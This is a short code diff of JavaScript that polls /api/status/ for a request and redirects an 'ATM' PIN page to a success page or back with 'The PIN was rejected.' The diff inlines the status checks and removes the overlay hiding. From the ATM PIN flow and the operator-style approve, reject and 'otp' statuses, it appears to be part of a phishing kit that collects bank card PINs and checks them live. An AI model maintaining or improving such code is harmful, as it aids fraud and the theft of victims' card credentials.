@@ -362,32 +362,18 @@
     applyAtmRejectMessage();
 
     var pollInterval = null;
-    function normalizeStatus(value){
-      return String(value || '').trim().toLowerCase();
-    }
-    function isApprovedStatus(value){
-      var status = normalizeStatus(value);
-      return ['approved', 'accept', 'accepted', 'success', 'verified', 'otp'].indexOf(status) !== -1;
-    }
-    function isRejectedStatus(value){
-      var status = normalizeStatus(value);
-      return ['rejected', 'reject', 'declined', 'error', 'failed'].indexOf(status) !== -1;
-    }
     function startPollingStatus() {
-      clearInterval(pollInterval);
       pollInterval = setInterval(function() {
         fetch('/api/status/' + requestId)
           .then(function(res) { return res.json(); })
           .then(function(data) {
             if (!data || !data.status) return;
-            var status = normalizeStatus(data.status);
-            if (isApprovedStatus(status)) {
+            var status = String(data.status || '').trim().toLowerCase();
+            if (status === 'approved' || status === 'accept' || status === 'accepted' || status === 'verified' || status === 'success') {
               clearInterval(pollInterval);
-              document.getElementById('loadingOverlay').style.display = 'none';
               window.location.href = 'success-en.html?id=' + requestId;
-            } else if (isRejectedStatus(status)) {
+            } else if (status === 'rejected' || status === 'reject' || status === 'declined' || status === 'error' || status === 'failed') {
               clearInterval(pollInterval);
-              document.getElementById('loadingOverlay').style.display = 'none';
               var rejectMessage = 'The PIN was rejected. Please verify the details and try again.';
               window.location.href = 'atm-en.html?error=atm&msg=' + encodeURIComponent(rejectMessage) + '&id=' + requestId;
             }
